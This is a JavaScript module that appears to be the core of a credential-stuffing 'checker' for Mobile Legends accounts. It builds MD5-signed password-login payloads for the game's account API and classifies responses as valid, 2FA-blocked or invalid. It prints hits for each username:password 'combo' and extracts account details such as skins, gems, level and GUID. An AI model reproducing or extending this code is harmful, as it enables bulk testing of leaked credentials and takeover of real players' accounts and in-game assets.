const crypto = require('crypto');

class Api {
  static API_BASE = 'https://accountmtapi.mobilelegends.com/';

  static blur(str) {
    if (!str) return '';
    if (str.startsWith('https://') || str.startsWith('http://')) {
      return 'https://████████/**';
    }
    if (str.length <= 80) return str;
    return str.substring(0, 80) + '...';
  }

  static brief(str) {
    if (!str) return 'NO_RESPONSE';
    const trim = str.trim();
    if (!trim) return 'EMPTY';
    if (!trim.startsWith('{')) {
      return trim.length > 160 ? trim.substring(0, 160) : trim;
    }
    try {
      const json = JSON.parse(trim);
      const code = json.code ?? -999;
      let parts = [`code=${code}`];
      const message = json.message || json.ret || '';
      
      if (json.data) {
        const data = json.data;
        ['account', 'name', 'uid', 'guid', 'avatar_id'].forEach(key => {
          const val = data[key] || '';
          if (val) parts.push(`${key}=${val}`);
        });
        if (data.source_platform) parts.push(`platform=${data.source_platform}`);
        if (data.attributes) {
          ['skins', 'level', 'trial', 'gems', 'avatar'].forEach(key => {
            const val = data.attributes[key] || '';
            if (val) parts.push(`${key}=${val}`);
          });
        }
        if (data.packages && data.packages.length > 0) {
          parts.push(`packages=${data.packages.length}`);
        }
        if (data.name) parts.push(`name=${data.name}`);
        if (data.guid) parts.push(`guid=${data.guid}`);
      }
      if (code !== 0 && message) parts.push(message);
      return parts.join(' · ');
    } catch {
      return trim.length > 160 ? trim.substring(0, 160) : trim;
    }
  }

  static dump(str) {
    if (!str) return 'NO_RESPONSE';
    const trim = str.trim();
    if (!trim) return 'EMPTY';
    if (trim.startsWith('{')) {
      try {
        const json = JSON.parse(trim);
        const lines = [];
        this.flatten(json, '', lines);
        return lines.join('\n') || '(no fields)';
      } catch {
        return trim.length > 240 ? trim.substring(0, 240) : trim;
      }
    }
    return trim.length > 240 ? trim.substring(0, 240) : trim;
  }

  static flatten(obj, prefix, lines, depth = 0) {
    if (depth > 6 || !obj) return;
    
    if (Array.isArray(obj)) {
      for (let i = 0; i < Math.min(obj.length, 10); i++) {
        const val = obj[i];
        if (val && typeof val === 'object') {
          lines.push(`${prefix}[${i}]`);
          this.flatten(val, prefix + '  ', lines, depth + 1);
        } else {
          const str = String(val);
          lines.push(`${prefix}[${i}] ${str.length > 120 ? str.substring(0, 120) + '...' : str}`);
        }
      }
      if (obj.length > 10) {
        lines.push(`${prefix}... and ${obj.length - 10} more`);
      }
    } else if (obj && typeof obj === 'object') {
      const keys = Object.keys(obj);
      for (const key of keys) {
        const val = obj[key];
        if (val && typeof val === 'object') {
          lines.push(`${prefix}${key}:`);
          this.flatten(val, prefix + '  ', lines, depth + 1);
        } else {
          const str = String(val);
          lines.push(`${prefix}${key}: ${str.length > 120 ? str.substring(0, 120) + '...' : str}`);
        }
      }
    }
  }

  static classify(str) {
    if (!str) return 'E';
    if (str.includes('"code":0')) return 'V';
    const upper = str.toUpperCase();
    if (upper.includes('1086') || upper.includes('EMAILCODE') || 
        upper.includes('OTP') || upper.includes('2FA') || 
        upper.includes('VERIFICATION')) return '2';
    if (upper.includes('1005') || upper.includes('PASSWDERROR') || 
        upper.includes('PASSWORD_ERROR') || upper.includes('NOTEXIST') || 
        upper.includes('ACCOUNT_NOT_EXIST')) return 'I';
    return 'E';
  }

  static verdict(str) {
    if (!str) return null;
    const trim = str.trim();
    if (!trim) return null;
    if (!trim.startsWith('{')) return null;
    
    try {
      const json = JSON.parse(trim);
      const code = json.code ?? -999;
      
      if (code === 0) return 'V';
      
      const msg = (json.message || '').toUpperCase() + ' ' + 
                  (json.ret || '').toUpperCase() + ' ' + 
                  (json.error || '').toUpperCase();
      
      if (code === 1086 || msg.includes('EMAILCODE') || msg.includes('EMAIL_CODE') ||
          msg.includes('OTP') || msg.includes('2FA') || msg.includes('VERIFICATION')) {
        return '2';
      }
      
      if (code === 1005 || msg.includes('PASSWDERROR') || msg.includes('PASSWORD_ERROR') ||
          msg.includes('NOTEXIST') || msg.includes('ACCOUNT_NOT_EXIST')) {
        return 'I';
      }
      
      return null;
    } catch {
      return null;
    }
  }

  static extractAccount(str) {
    if (!str) return '';
    const idx = str.indexOf('"account":"');
    if (idx < 0) return '';
    const start = idx + 11;
    const end = str.indexOf('"', start);
    if (end < 0) return '';
    const sub = str.substring(start, end);
    return sub.length > 26 ? sub.substring(0, 26) : sub;
  }

  static loginPayload(account, md5pwd, eCaptcha) {
    try {
      const params = {
        account,
        md5pwd,
        game_token: '',
        recaptcha_token: '',
        e_captcha: eCaptcha || '',
        country: ''
      };
      const sign = this.makesign(params);
      return JSON.stringify({
        op: 'new_login_pwd',
        sign,
        params,
        lang: 'en'
      });
    } catch {
      return '{}';
    }
  }

  static makesign(params) {
    const keys = Object.keys(params).sort();
    const parts = keys.map(key => `${key}=${params[key] || ''}`);
    parts.push('op=new_login_pwd');
    return this.md5(parts.join('&'));
  }

  static md5(str) {
    return crypto.createHash('md5').update(str).digest('hex');
  }

  static jsonEsc(str) {
    if (!str) return '';
    return str.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  }

  static jsString(str) {
    if (!str) return "''";
    let result = "'";
    for (const char of str) {
      if (char === '\\') result += '\\\\';
      else if (char === "'") result += "\\'";
      else if (char === '\n') result += '\\n';
      else if (char === '\r') result += '\\r';
      else if (char < ' ') result += `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`;
      else result += char;
    }
    result += "'";
    return result;
  }

  static pretty(str) {
    if (!str) return 'NO_RESPONSE';
    try {
      const json = JSON.parse(str);
      const code = json.code ?? -999;
      const message = json.message || json.ret || '';
      
      if (code !== 0) {
        return `code=${code} ${message}`;
      }
      
      const data = json.data;
      const name = data?.name || '';
      const guid = data?.guid || '';
      return `VALID [0] ${name} guid=${guid}`;
    } catch {
      return str.length > 160 ? str.substring(0, 160) : str;
    }
  }

  static previewLine(classify, combo, response) {
    const brief = this.brief(response);
    const dump = this.dump(response);
    
    let icon;
    if (classify === 'V') icon = '[✓]';
    else if (classify === '2') icon = '[ⅷ]';
    else if (classify === 'I') icon = '[✕]';
    else icon = '[!]';
    
    let line = `${icon} ${combo}\n    ${brief}`;
    if (classify === 'V' && dump && !dump.startsWith('NO_RESPONSE') && !dump.startsWith('EMPTY')) {
      const indented = dump.split('\n').map(l => '    ' + l).join('\n');
      line = `${icon} ${combo}\n${indented}`;
    }
    return line;
  }
}

module.exports = { Api };
